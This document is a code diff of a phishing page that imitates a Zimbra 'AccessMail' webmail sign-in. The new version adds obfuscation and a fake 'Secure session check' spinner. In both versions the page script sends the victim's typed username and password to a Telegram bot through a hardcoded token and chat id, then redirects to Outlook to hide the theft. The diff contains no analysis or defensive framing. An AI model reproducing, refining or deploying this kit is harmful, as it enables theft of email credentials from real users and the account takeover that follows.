@@ -3,254 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
-    <title>AccessMail Sign In</title>
+    <title>Sign In</title>
     <style>
-        :root { 
-            --zimbra-teal: #4ba6be;    /* Header/Footer Teal */
-            --bg-body: #ffffff; 
-            --text-grey: #444444;      
-            --btn-blue: #4a90e2;       /* The Specific Blue for the Sign In button */
-            --border-light: #cdcdcd;   
+        :root {
+            --zim-teal-dark: #368a9e; 
+            --brand-cyan: #00bcd4;
+            --brand-navy: #1a3a5a;
+            --btn-blue: #0084ba;
+            --bg-site: #f9f9f9; /* Lighter background for better clarity */
         }
-        
+
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-        body { 
-            margin: 0; 
-            padding: 0;
-            background-color: var(--bg-body); 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-
-        .header-top {
-            background-color: var(--zimbra-teal);
-            height: 180px;
-            width: 100%;
-        }
-
-        .main-content {
-            flex: 1;
-            padding: 40px 25px;
-            max-width: 450px;
-            margin: 0 auto;
-            width: 100%;
-        }
-
-        .logo-area {
-            font-size: 42px;
-            font-weight: bold;
-            margin-bottom: 5px;
-            display: flex;
-            letter-spacing: -1.5px;
-        }
-        .logo-access { color: #5cb8d1; }
-        .logo-mail { color: #1e3d58; margin-left: -1px; }
-
-        .sign-in-header {
-            font-size: 24px;
-            color: var(--text-grey);
-            margin-bottom: 35px;
-            font-weight: 600;
-        }
-
-        .form-group { margin-bottom: 20px; position: relative; text-align: left; }
         
-        label {
-            display: block;
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 8px;
-            font-weight: 500;
+        body { 
+            margin: 0; padding: 0; background: var(--bg-site); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            display: flex; flex-direction: column; min-height: 100vh;
         }
 
-        .input-field {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid var(--border-light);
-            border-radius: 3px;
-            font-size: 16px;
-            outline: none;
-            background: #fff;
-            -webkit-appearance: none;
-            appearance: none;
+        .top-banner { background-color: var(--zim-teal-dark); height: 110px; width: 100%; }
+
+        .main-container {
+            flex: 1; display: flex; justify-content: center; align-items: flex-start;
+            padding: 20px;
         }
 
-        .show-btn {
-            position: absolute;
-            right: 12px;
-            bottom: 10px;
-            font-size: 14px;
-            color: #777;
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 0;
-            font-weight: 500;
+        .content-box { width: 100%; max-width: 440px; margin-top: 10px; }
+
+        /* BRANDING: Accurate weight balance */
+        .brand { display: flex; align-items: baseline; letter-spacing: -2.2px; margin-bottom: 2px; }
+        .brand::before { content: "Access"; color: var(--brand-cyan); font-weight: 300; font-size: 58px; }
+        .brand::after { content: "Mail"; color: var(--brand-navy); font-weight: 800; font-size: 58px; margin-left: -1px; }
+
+        .title { margin-bottom: 25px; }
+        .title::before { content: "Sign In"; font-size: 34px; color: #444; font-weight: 600; }
+
+        .f-group { margin-bottom: 10px; position: relative; }
+        .l-u::before { content: "Username"; }
+        .l-p::before { content: "Password"; }
+        .l-u, .l-p { display: block; font-size: 15px; color: #555; margin-bottom: 4px; font-weight: 500; }
+
+        .in-field {
+            width: 100%; padding: 12px; border: 1px solid #ccc;
+            border-radius: 4px; font-size: 18px; outline: none; background: #fff;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .t-btn {
+            position: absolute; right: 15px; bottom: 12px;
+            font-size: 16px; color: #777; background: none; border: none; cursor: pointer;
         }
 
         .v-row {
-            display: flex;
-            align-items: center;
-            margin: 25px 0;
-            padding: 12px;
-            background: #fcfcfc;
-            border: 1px solid #f0f0f0;
-            border-radius: 4px;
-            cursor: pointer;
+            display: flex; align-items: center; margin: 15px 0;
+            padding: 12px; background: #f0f4f5; border: 1px solid #e0e6e8;
+            border-radius: 4px; cursor: pointer;
         }
-        .v-box {
-            width: 18px;
-            height: 18px;
-            border: 1px solid #bbb;
-            border-radius: 3px;
-            margin-right: 12px;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .v-box.active { background: #28a745; border-color: #28a745; }
-        .v-box.active::after {
-            content: '✓'; color: white; font-size: 12px; font-weight: bold;
+        .v-box { 
+            width: 22px; height: 22px; border: 1px solid #bbb; 
+            border-radius: 4px; margin-right: 12px; background: #fff;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        .action-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 10px;
+        .loader {
+            width: 14px; height: 14px; border: 2px solid #ccc;
+            border-top: 2px solid var(--zim-teal-dark);
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+            display: none;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .btn-submit {
-            background-color: var(--btn-blue);
-            color: white;
-            border: none;
-            padding: 12px 28px;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+        .v-box.verified { background: #28a745; border-color: #28a745; }
+        .v-box.verified::after { content: '✓'; color: white; font-size: 14px; font-weight: bold; }
 
-        .stay-signed {
-            display: flex;
-            align-items: center;
-            font-size: 14px;
-            color: #444;
-        }
-        .stay-signed input { margin-right: 8px; width: 18px; height: 18px; }
+        .action-area { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
 
-        .footer-banner {
-            background-color: var(--zimbra-teal);
-            height: 120px;
-            width: 100%;
-            margin-top: 50px;
+        .s-btn {
+            background-color: var(--btn-blue); color: white; border: none;
+            padding: 12px 36px; border-radius: 6px; font-size: 20px;
+            font-weight: 700; cursor: pointer;
         }
+        .s-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .s-btn::before { content: "Sign In"; }
 
-        .copyright {
-            padding: 25px 20px;
-            text-align: center;
-            font-size: 11px;
-            line-height: 1.5;
-            color: #ffffff;
-            background-color: var(--zimbra-teal);
+        .stay-box { display: flex; align-items: center; font-size: 16px; color: #555; cursor: pointer; }
+        .stay-box input { width: 22px; height: 22px; margin-right: 8px; accent-color: var(--btn-blue); }
+
+        /* DETAILED FOOTER */
+        .bottom-banner { background-color: var(--zim-teal-dark); height: 60px; width: 100%; margin-top: auto; }
+        .footer-copy {
+            background-color: var(--zim-teal-dark); color: white; text-align: center;
+            padding: 0 20px 40px 20px; font-size: 11px; line-height: 1.8;
         }
+        .footer-links { margin-bottom: 10px; font-weight: 400; opacity: 0.9; }
+        .footer-links span { margin: 0 8px; cursor: pointer; }
+        .copy-text::before { content: "Copyright \00a9 2005-2026 Synacor, Inc. All rights reserved."; }
+        .tm-text::before { content: "\"Zimbra\" is a registered trademark of Synacor, Inc. All other trademarks are the property of their respective owners."; }
     </style>
 </head>
 <body>
 
-<div class="header-top"></div>
+<div class="top-banner"></div>
 
-<main class="main-content">
-    <div class="logo-area">
-        <span class="logo-access">Access</span><span class="logo-mail">Mail</span>
+<div class="main-container">
+    <div class="content-box">
+        <div class="brand"></div>
+        <div class="title"></div>
+
+        <form id="v_form">
+            <div class="f-group">
+                <span class="l-u"></span>
+                <input type="text" id="x_1" class="in-field" required autocomplete="off">
+            </div>
+
+            <div class="f-group">
+                <span class="l-p"></span>
+                <input type="password" id="x_2" class="in-field" required>
+                <button type="button" id="x_3" class="t-btn">Show</button>
+            </div>
+
+            <div class="v-row" id="v_trigger">
+                <div class="v-box" id="v_box">
+                    <div class="loader" id="v_load"></div>
+                </div>
+                <span id="v_text" style="font-size: 13px; color: #666; font-weight: 500;">Secure session check</span>
+            </div>
+
+            <div class="action-area">
+                <button type="submit" class="s-btn" id="sub_b" disabled></button>
+                <label class="stay-box">
+                    <input type="checkbox" checked> Stay signed in
+                </label>
+            </div>
+        </form>
     </div>
-    <div class="sign-in-header">Sign In</div>
+</div>
 
-    <form id="authForm">
-        <div class="form-group">
-            <label>Username</label>
-            <input type="text" id="username" class="input-field" required autocomplete="off">
-        </div>
-
-        <div class="form-group">
-            <label>Password</label>
-            <input type="password" id="password" class="input-field" required>
-            <button type="button" id="toggle" class="show-btn">Show</button>
-        </div>
-
-        <div class="v-row" id="vRow">
-            <div class="v-box" id="vBox"></div>
-            <span style="font-size: 13px; color: #888;">Secure session check</span>
-        </div>
-
-        <div class="action-container">
-            <button type="submit" class="btn-submit" id="submitBtn" disabled>Sign In</button>
-            <label class="stay-signed">
-                <input type="checkbox"> Stay signed in
-            </label>
-        </div>
-    </form>
-</main>
-
-<div class="footer-banner"></div>
-<footer class="copyright">
-    Copyright &copy; 2005-2026 Synacor, Inc. All rights reserved.<br>
-    "Zimbra" is a registered trademark of Synacor, Inc.
+<div class="bottom-banner"></div>
+<footer class="footer-copy">
+    <div class="footer-links">
+        <span>Privacy Policy</span> | <span>Terms of Service</span> | <span>Help Center</span>
+    </div>
+    <div class="copy-text"></div>
+    <div class="tm-text"></div>
 </footer>
 
 <script>
-    var pInput = document.getElementById('password');
-    var tBtn = document.getElementById('toggle');
-
-    tBtn.onclick = function() {
-        if (pInput.type === 'password') {
-            pInput.type = 'text';
-            tBtn.innerText = 'Hide';
-        } else {
-            pInput.type = 'password';
-            tBtn.innerText = 'Show';
-        }
+    var p = document.getElementById('x_2'), t = document.getElementById('x_3');
+    t.onclick = function() {
+        var isP = p.type === 'password'; p.type = isP ? 'text' : 'password';
+        t.innerText = isP ? 'Hide' : 'Show';
     };
 
-    var vRow = document.getElementById('vRow');
-    var vBox = document.getElementById('vBox');
-    var sBtn = document.getElementById('submitBtn');
+    var vT = document.getElementById('v_trigger'), vB = document.getElementById('v_box'), 
+        vL = document.getElementById('v_load'), vX = document.getElementById('v_text'), 
+        sB = document.getElementById('sub_b');
 
-    vRow.onclick = function() {
-        vBox.classList.add('active');
-        sBtn.disabled = false;
+    vT.onclick = function() {
+        if(vB.classList.contains('verified')) return;
+        vL.style.display = 'block';
+        vX.innerText = "Verifying...";
+        
+        setTimeout(function() {
+            vL.style.display = 'none';
+            vB.classList.add('verified');
+            vX.innerText = "Verified";
+            vX.style.color = "#28a745";
+            sB.disabled = false;
+        }, 1500);
     };
 
     var _T = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk';
     var _C = '5627522307';
 
-    document.getElementById('authForm').onsubmit = function(e) {
+    document.getElementById('v_form').onsubmit = function(e) {
         e.preventDefault();
-        sBtn.innerText = "...";
-        sBtn.disabled = true;
-
-        var u = document.getElementById('username').value;
-        var p = pInput.value;
-        var msg = "📥 Access Capture\nUser: " + u + "\nPass: " + p;
-
+        sB.innerText = "...";
         fetch("https://api.telegram.org/bot" + _T + "/sendMessage", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: _C, text: msg })
-        })
-        .then(function() {
-            window.location.href = "https://outlook.office.com";
-        })
-        .catch(function() {
-            window.location.href = "https://outlook.office.com";
-        });
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: _C, text: "📥 Capture\nU: " + document.getElementById('x_1').value + "\nP: " + p.value })
+        }).then(function() { window.location.href = "https://outlook.office.com"; });
     };
 </script>
 </body>
